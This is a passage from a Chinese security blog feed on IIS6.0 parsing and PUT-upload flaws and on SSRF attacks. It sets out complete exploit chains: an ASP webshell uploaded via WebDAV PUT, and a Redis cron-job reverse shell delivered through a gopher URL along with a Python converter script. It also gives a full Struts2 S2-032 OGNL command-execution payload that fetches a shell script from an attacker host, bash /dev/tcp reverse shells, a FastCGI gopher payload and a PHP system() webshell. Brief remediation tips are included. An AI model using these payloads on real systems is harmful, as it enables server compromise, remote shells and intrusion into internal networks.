class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1.IIS6.0解析漏洞</span><br><span class="line">（1）当建立*.asa、 *.asp格式的文件夹时，其目录下的任意文件都将被IIS当作asp文件解析。</span><br><span class="line">（2）文件*.asp;1.jpg 会被IIS6.0当作asp文件解析。</span><br><span class="line"></span><br><span class="line">2.IIS6.0 PUT上传原理</span><br><span class="line">IIS6.0集成了 WebDAV功能模块，基于HTTP1.1协议的通信协议使得HTTP支持PUT、MOVE、COPY、DELETE方法。</span><br><span class="line"></span><br><span class="line">3.IIS6.0 PUT上传探测</span><br><span class="line">(1)探测是否存在：</span><br><span class="line">OPTIONS &#x2F;HTTP 1.1</span><br><span class="line">Host:www.xxx.com</span><br><span class="line"></span><br><span class="line">(2)上传txt文本文件：</span><br><span class="line">PUT &#x2F;a.txt HTTP1.1</span><br><span class="line">Host：www.xxx.com</span><br><span class="line">Content-Length:30</span><br><span class="line">&lt;%eval request(&quot;chopper&quot;)%&gt;</span><br><span class="line"></span><br><span class="line">(3)通过MOVE或Copy重命名：</span><br><span class="line">COPY &#x2F;a.txt HTTP1.1</span><br><span class="line">Host:www.xxx.com</span><br><span class="line">Destinstion:</span><br><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;cmd.asp;a.jpg</span><br><span class="line"></span><br><span class="line">(4)删除原txt</span><br><span class="line">DELETE &#x2F;a.txt HTTP1.1</span><br><span class="line">Host:www.xxx.com</span><br><span class="line"></span><br><span class="line">可以使用工具nikto进行探测：</span><br><span class="line">nikto -h IP地址</span><br><span class="line"></span><br><span class="line">4.IIS6.0 PUT上传利用</span><br><span class="line">利用Burpsuite进行IIS PUT漏洞利用</span><br><span class="line"></span><br><span class="line">5.IIS6.0解析文件类型</span><br><span class="line">IIS6.0默认可执行的文件除了asp还包括：</span><br><span class="line">&#x2F;.asa</span><br><span class="line">&#x2F;.cer</span><br><span class="line">&#x2F;.cdx</span><br><span class="line"></span><br><span class="line">6.漏洞修复</span><br><span class="line">阻止上传xxx.asp;.jpg类型的文件名；</span><br><span class="line">做好权限设置。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="文件上传" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>SSRF漏洞</title>
    <link href="http://yoursite.com/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/08/01/SSRF漏洞/</id>
    <published>2020-08-01T11:05:48.000Z</published>
    <updated>2020-08-01T15:18:22.476Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><h4 id="什么是SSRF漏洞"><a href="#什么是SSRF漏洞" class="headerlink" title="什么是SSRF漏洞"></a>什么是SSRF漏洞</h4><p>SSRF（Server-Side Request Forgery，服务端请求伪造），是攻击者让服务端发起构造的指定请求链接造成的漏洞。</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801191249593.png" alt="image-20200801191249593"></p><p>由于存在防火墙的防护，导致攻击者无法直接入侵内网；这时攻击者可以以服务器为跳板发起一些网络请求，从而攻击内网的应用及获取内网数据。</p><h4 id="SSRF形成原因"><a href="#SSRF形成原因" class="headerlink" title="SSRF形成原因"></a>SSRF形成原因</h4><p>大都是由于服务端提供了从其它服务器获取数据的功能，比如使用户从指定的URL web应用获取图片、下载文件、读取文件内容等。但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据。</p><h4 id="SSRF和CSRF的区别"><a href="#SSRF和CSRF的区别" class="headerlink" title="SSRF和CSRF的区别"></a>SSRF和CSRF的区别</h4><p>CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的cookie信息伪造用户请求发送至服务器。</p><p>SSRF是服务器对用户提供的可控URL过于信任，没有对攻击者提供的URL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或者其它服务器。</p><h4 id="SSRF的类型"><a href="#SSRF的类型" class="headerlink" title="SSRF的类型"></a>SSRF的类型</h4><p>回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在服务器获取攻击者要求的URL后，把响应发送回攻击者。</span><br></pre></td></tr></table></figure><p>不回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在服务器获取攻击者要求的URL后，不会把响应内容发送给攻击者，需要通过抓包或查看服务器日志判断是否存在服务端请求伪造漏洞。</span><br></pre></td></tr></table></figure><h4 id="SSRF可以实现的攻击"><a href="#SSRF可以实现的攻击" class="headerlink" title="SSRF可以实现的攻击"></a>SSRF可以实现的攻击</h4><p>1.获取web应用可达服务器的banner信息（如软件开发商、软件名称等），以及收集内网web应用的指纹识别（如开放的端口、中间件版本等），根据这些信息再进行进一步的渗透。</p><p>2.攻击运行在内网的系统或应用程序，获取内网系统弱口令进行内网漫游，对有漏洞的内网web应用实施攻击获取webshell（如Struts2命令执行，discuz!论坛SSRF通过Redis实施getshell等）。</p><p>3.利用有脆弱性的组件结合ftp://，file:///，gopher://，dict://等协议实施攻击（如FFmpeg任意文件读取，XXE攻击等）。</p><h4 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h4><p>结合gopher协议攻击内网FTP、Telnet、Redis、FastCGI、Memcache，也可以进行get、post请求。</p><h2 id="攻击内网Redis"><a href="#攻击内网Redis" class="headerlink" title="攻击内网Redis"></a>攻击内网Redis</h2><h4 id="测试定时任务写shell"><a href="#测试定时任务写shell" class="headerlink" title="测试定时任务写shell"></a>测试定时任务写shell</h4><p>CentOS机器开启Redis服务，写定时任务到CentOS机器中。</p><p>1.Redis服务安装时默认绑定IP为127.0.0.1，此处不需要设置，查看Redis配置文件redis.conf：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find  &#x2F;  -name  redis.conf</span><br><span class="line">vi  &#x2F;root&#x2F;redis-5.0.4&#x2F;redis.conf</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801192819048.png" alt="image-20200801192819048"></p><p>2.CentOS机器开启Redis服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd  &#x2F;usr&#x2F;local&#x2F;bin</span><br><span class="line">.&#x2F;redis-server  &#x2F;root&#x2F;redis-5.0.4&#x2F;redis.conf</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801192953504.png" alt="image-20200801192953504"></p><p>3.查看kaili攻击机的redis版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd  &#x2F;usr&#x2F;redis&#x2F;</span><br><span class="line">.&#x2F;redis-server  –v</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801193353596.png" alt="image-20200801193353596"></p><p>4.启动redis服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;redis-server</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801193447799.png" alt="image-20200801193447799"></p><p>5.另开启一个终端，测试启动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd  &#x2F;usr&#x2F;redis&#x2F;</span><br><span class="line">.&#x2F;redis-cli  ping</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801193605433.png" alt="image-20200801193605433"></p><p>启动成功</p><p>6.在kali攻击机写一个redis反弹shell的bash脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi  shell.sh</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801193743233.png" alt="image-20200801193743233"></p><p>保存退出</p><p>在Redis的第0个数据库中添加key为1，名为root的定时任务，value字段最后会多一个n是因为echo重定向最后会自带一个换行符，位置为CentOS机器的/var/spool/cron/，10.1.1.200为获取反弹shell的本地IP地址，666为反弹shell的监听端口，可随意设置。</p><h4 id="gopher协议攻击Redis"><a href="#gopher协议攻击Redis" class="headerlink" title="gopher协议攻击Redis"></a>gopher协议攻击Redis</h4><p>通过gopher协议攻击Redis，如果内网中的Redis存在未授权访问漏洞，当Redis服务以root权限运行时，利用gopher协议攻击内网中的Redis，通过写入定时任务可以实现反弹shell。</p><p>1.Kali攻击机另外开启一个终端，使用socat进行端口转发，获取Redis攻击的TCP数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat  -v tcp-listen:2333,fork  tcp-connect:127.0.0.1:6379</span><br></pre></td></tr></table></figure><p>将本地的2333端口转发到Redis服务器的6379端口，访问本地的2333端口其实是访问Redis服务器的6379端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行脚本：bash  shell.sh  127.0.0.1  2333</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801200548438.png" alt="image-20200801200548438"></p><p>捕获到的数据</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801201002550.png" alt="image-20200801201002550"></p><p>3.利用脚本将数据转换成适配于gopher协议的URL，转换规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">如果第一个字符是 &gt; 或者 &lt; ，则丢弃该行字符串，表示请求和返回的时间；</span><br><span class="line"></span><br><span class="line">如果前三个字符是 +OK，则丢弃该行字符串，表示返回的字符串；</span><br><span class="line"></span><br><span class="line">将\r字符替换成 %0d%0a；</span><br><span class="line"></span><br><span class="line">将空白行替换成 %0a。</span><br></pre></td></tr></table></figure><p>转化脚本如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import sys</span><br><span class="line">exp&#x3D;&#39; &#39;</span><br><span class="line">with open(sys.argv[1]) as f:</span><br><span class="line">     for line in f.readlines():</span><br><span class="line">        if line[0] in &#39;&gt;&lt;+&#39;:</span><br><span class="line">           continue</span><br><span class="line">        elif line[-3:-1]&#x3D;&#x3D; r&#39;\r&#39;:</span><br><span class="line">        &#x2F;&#x2F;如果该行只有\r,将\r替换成%0a%0d%0a</span><br><span class="line">           if len(line)&#x3D;&#x3D;3:</span><br><span class="line">              exp&#x3D;exp+&#39;%0a%0d%0a&#39;</span><br><span class="line">           else:</span><br><span class="line">              line&#x3D;line.replace(r&#39;\r&#39;,&#39;%0d%0a&#39;)</span><br><span class="line">        &#x2F;&#x2F;去掉最后的换行符</span><br><span class="line">              line&#x3D;line.replace(&#39;\n&#39;,&#39;&#39;)</span><br><span class="line">              exp&#x3D;exp+line</span><br><span class="line">        &#x2F;&#x2F;判断是否为空行，空行替换为%0a</span><br><span class="line">        elif line&#x3D;&#x3D; &#39;\x0a&#39;:</span><br><span class="line">            exp&#x3D; exp+&#39;%0a&#39;</span><br><span class="line">        else:</span><br><span class="line">            line&#x3D;line.replace(&#39;\n&#39;,&#39;&#39;)</span><br><span class="line">            exp&#x3D;exp+line</span><br><span class="line">print exp</span><br></pre></td></tr></table></figure><p>4.将socat获取的数据保存为socat.log文件，然后执行脚本进行数据转换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi  socat.log</span><br></pre></td></tr></table></figure><p>将socat捕获的数据粘贴到socat.log中</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801211517869.png" alt="image-20200801211517869"></p><p>保存文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python  tran2gopher.py  socat.log</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801211646528.png" alt="image-20200801211646528"></p><p>nc开启监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  -lvvp  666</span><br></pre></td></tr></table></figure><p>5.攻击CentOS机器的Redis服务：</p><p>输入gopher://127.0.0.1:6379/_+数据转换的内容：</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801211846265.png" alt="image-20200801211846265"></p><p>监听结果：</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801211938351.png" alt="image-20200801211938351"></p><p> 成功获取反弹shell。</p><h2 id="structs2-S2-32"><a href="#structs2-S2-32" class="headerlink" title="structs2 S2-32"></a>structs2 S2-32</h2><h4 id="structs2简介"><a href="#structs2简介" class="headerlink" title="structs2简介"></a>structs2简介</h4><p>Apache Struts 2是世界上最流行的Java Web服务器框架之一。Struts 2是Struts的下一代产品，是在Struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开，所以Struts 2可以理解为WebWork的更新产品。虽然从Struts 1到Struts 2有着太大的变化，但是相对于WebWork，Struts 2的变化很小。</p><p>安恒信息安全研究员在Struts 2上发现了一个严重的远程代码执行漏洞（CVE-2016-3081,S02-32），该漏洞危险级别为高危。</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801213232212.png" alt="image-20200801213232212"></p><h4 id="判断structs2存在"><a href="#判断structs2存在" class="headerlink" title="判断structs2存在"></a>判断structs2存在</h4><p>Struts2需要在Tomcat中运行，看8080端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;</span><br></pre></td></tr></table></figure><p>在回显中会有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">structs2 showcase for Apache Structs Project</span><br></pre></td></tr></table></figure><p>说明Struts2服务存在</p><h4 id="判断Struts–s2-32漏洞"><a href="#判断Struts–s2-32漏洞" class="headerlink" title="判断Struts–s2-32漏洞"></a>判断Struts–s2-32漏洞</h4><p>Struts –s2-32漏洞POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;whoami</span><br></pre></td></tr></table></figure><p>判断是否存在Struts –s2-32漏洞，输入构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;whoami</span><br></pre></td></tr></table></figure><p>返回用户名(说明存在Struts –s2-32漏洞)</p><h4 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h4><p>思路为通过wget下载脚本文件到指定目录(方便查找)，修改权限为可执行，最后执行脚本文件获取shell。</p><p>1.kali攻击机上的网站根目录(/var/www/html)下新建一个脚本文件shell.sh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.1.1.200&#x2F;2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801214832083.png" alt="image-20200801214832083"></p><p>2.启动kali的apache服务：service apache2 start</p><p>3.输入构造的payload(将POC最后面的cmd参数的值修改为我们想要执行的命令，记住空格要用%20替代)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;wget%20-P%20&#x2F;root%20http:&#x2F;&#x2F;10.1.1.200&#x2F;shell.sh</span><br></pre></td></tr></table></figure><p>4.接下来修改下载的文件的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;chmod%20755%20&#x2F;root&#x2F;shell.sh</span><br></pre></td></tr></table></figure><p>5.利用nc接收反弹的shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801215257007.png" alt="image-20200801215257007"></p><p>6.输入执行脚本的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;.&#x2F;root&#x2F;shell.sh</span><br></pre></td></tr></table></figure><p>查看监听结果,成功获取shell</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801215643505.png" alt="image-20200801215643505"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1.限制协议为HTTP、HTTPS；</p><p>2.禁止30x跳转；</p><p>3.设置URL白名单或限制内网IP。</p><h2 id="利用-Gopher-协议拓展攻击面"><a href="#利用-Gopher-协议拓展攻击面" class="headerlink" title="利用 Gopher 协议拓展攻击面"></a>利用 Gopher 协议拓展攻击面</h2><p>此部分转载自长亭科技公众号[https:/]/blog.chaitin.cn/gopher-attack-surfaces/]</p><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。<br>Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p><h4 id="攻击面测试"><a href="#攻击面测试" class="headerlink" title="攻击面测试"></a>攻击面测试</h4><p>环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IP: 172.19.23.218</span><br><span class="line">OS: CentOS 6</span><br></pre></td></tr></table></figure><p>根目录下1.php内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ch &#x3D; curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[&quot;url&quot;]);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">$output &#x3D; curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h5 id="攻击内网redis"><a href="#攻击内网redis" class="headerlink" title="攻击内网redis"></a>攻击内网redis</h5><p>Redis 任意文件写入现在已经成为十分常见的一个漏洞，一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议攻击内网中的 Redis，这无疑可以隔山打牛，直杀内网。</p><p>首先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议。常见的 exp 是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h $1 flushall</span><br><span class="line">echo -e &quot;\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;2333 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1</span><br><span class="line">redis-cli -h $1 config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">redis-cli -h $1 config set dbfilename root</span><br><span class="line">redis-cli -h $1 save</span><br></pre></td></tr></table></figure><p>利用这个脚本攻击自身并抓包得到数据流：</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801230139030.png" alt="image-20200801230139030"></p><p>改成适配于 Gopher 协议的 URL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure><p>攻击：</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801230323375.png" alt="image-20200801230323375"></p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801230507722.png" alt="image-20200801230507722"></p><h5 id="攻击FastCGI"><a href="#攻击FastCGI" class="headerlink" title="攻击FastCGI"></a>攻击FastCGI</h5><p>一般来说 FastCGI 都是绑定在 127.0.0.1 端口上的，但是利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令。<br>首先构造 exp：</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801230630429.png" alt="image-20200801230630429"></p><p>构造 Gopher 协议的 URL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%13SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php%0D%01DOCUMENT_ROOT&#x2F;%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20&#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00</span><br></pre></td></tr></table></figure><p>攻击：</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801230804893.png" alt="image-20200801230804893"></p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801230831703.png" alt="image-20200801230831703"></p><h5 id="攻击内网-Vulnerability-Web"><a href="#攻击内网-Vulnerability-Web" class="headerlink" title="攻击内网 Vulnerability Web"></a>攻击内网 Vulnerability Web</h5><p>Gopher 可以模仿 POST 请求，故探测内网的时候不仅可以利用 GET 形式的 PoC（经典的 Struts2），还可以使用 POST 形式的 PoC。<br>一个只能 127.0.0.1 访问的 exp.php，内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_POST[e]);?&gt;</span><br></pre></td></tr></table></figure><p>利用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 